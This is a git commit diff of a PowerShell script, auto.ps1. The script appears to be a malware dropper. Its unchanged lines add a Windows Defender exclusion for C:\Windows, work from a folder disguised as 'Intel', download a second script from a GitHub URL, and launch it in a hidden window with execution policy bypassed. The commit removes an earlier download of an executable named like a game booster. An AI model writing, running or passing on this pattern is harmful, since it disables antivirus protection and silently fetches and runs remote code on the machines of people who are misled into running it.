5c1a82c35ef7d4cb39b06f59bda0c07e6a44b55c
Alinsmekeru <113843071+Alinsmekeru@users.noreply.github.com>
2024-09-14 18:54:49 +0300

    Update auto.ps1

--- auto.ps1
+++ auto.ps1
@@ -3,8 +3,6 @@ Add-MpPreference -ExclusionPath "C:\Windows"
 
 cd "$env:UserProfile\Intel" 
 
-Invoke-WebRequest -Uri 'https://github.com/Alinsmekeru/Intel3/blob/main/FiveMBooster.exe' -O "$env:UserProfile\Intel\FiveMBooster.exe"
-
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Alinsmekeru/Intel3/main/tas.ps1' -O "$env:UserProfile\Intel\tas.ps1"
 
 cmd /c PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-W Hidden -NoProfile -ExecutionPolicy Bypass -File ""$env:UserProfile\Intel\tas.ps1""'}"
